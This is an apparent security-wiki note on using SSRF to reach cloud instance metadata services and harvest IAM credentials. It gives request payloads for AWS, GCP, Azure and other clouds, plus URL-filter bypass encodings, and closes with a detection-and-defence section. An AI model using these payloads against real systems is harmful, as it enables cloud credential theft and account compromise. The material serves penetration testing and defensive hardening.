---
title: SSRF → cloud metadata
slug: ssrf-to-cloud
---

> **TL;DR:** SSRF reaches 169.254.169.254 to harvest cloud instance credentials.

## What it is
Cloud VMs expose an instance metadata service (IMDS) on the link-local address `169.254.169.254` (AWS, GCP, Azure, OCI, Alibaba). It is reachable only from the VM itself but it is reachable *unauthenticated* from inside, and it hands out the IAM role credentials the VM is allowed to use. An [[ssrf]] primitive in any web app running on that VM bridges the public internet to those credentials — typically a complete cloud-account compromise scoped by whatever the role grants.

## Preconditions / where it applies
- Workload running on a cloud VM / serverless instance with an attached role
- An SSRF or open-proxy primitive in the application (URL parameter that the server fetches, image proxy, webhook tester, XXE OOB, PDF/HTML renderer)
- IMDS not pinned to v2 (AWS) or local-only enforcement absent

## Technique
**AWS IMDSv1** (no token required):

```
GET /?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ "MyRoleName"
GET /?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRoleName
→ {"AccessKeyId":"ASIA…","SecretAccessKey":"…","Token":"…","Expiration":"…"}
```

Use the temporary credentials with the AWS CLI / SDK against any service the role can touch (S3 dump, DynamoDB enumeration, lateral IAM, console federation).

**AWS IMDSv2** requires a PUT for a token then GET with header:

```
PUT /latest/api/token  HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600
```

Many SSRF primitives are HTTP-method-restricted to GET — but some allow controlling method (e.g. SSRF inside a fetch library, or `gopher://` smuggling). Some apps also let attackers set arbitrary headers — combine with `X-Forwarded-For` chain to set the token header. SSRF chains via Redis `gopher://` retain method control.

**GCP:** `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` — requires header `Metadata-Flavor: Google`. If SSRF can't set headers, look for DNS rebinding or an upstream proxy that adds the header.

**Azure:** `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` — requires `Metadata: true` header.

**Alibaba / Oracle / DigitalOcean:** same idea, slightly different paths — `100.100.100.200/latest/meta-data/`, `169.254.169.254/opc/v2/instance/`.

**Bypass URL filters.** `http://169.254.169.254` blocklisted? Try:
- `http://[::ffff:a9fe:a9fe]/` (IPv6 mapped IPv4)
- `http://2852039166/` (decimal IP)
- `http://169.254.169.254.nip.io/`
- DNS rebinding (see [[dns-rebinding]]): hostname that resolves first to attacker IP (passes SSRF filter), then to 169.254.169.254 on the second resolve

Once credentials are in hand, pivot through cloud APIs — see cloud-red-team notes.

## Detection and defence
- Enforce IMDSv2 token-required mode (AWS launch template `HttpTokens=required`)
- Set IMDS hop limit to 1 (prevents container escape via host metadata)
- Drop egress to link-local from application VPC NACL where possible
- Allowlist destination hosts in any URL-fetching feature; resolve and re-validate after DNS lookup; refuse private / link-local / loopback
- Use short-lived IAM roles with minimal permissions; alert on credentials used outside expected VPC/IP range (GuardDuty `InstanceCredentialExfiltration`)

## References
- [Hacking the Cloud — EC2 metadata SSRF](https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/) — AWS specifics
- [PortSwigger — SSRF](https://portswigger.net/web-security/ssrf) — primitives and bypass
- [GCP — Metadata server best practices](https://cloud.google.com/compute/docs/metadata/overview) — vendor guidance
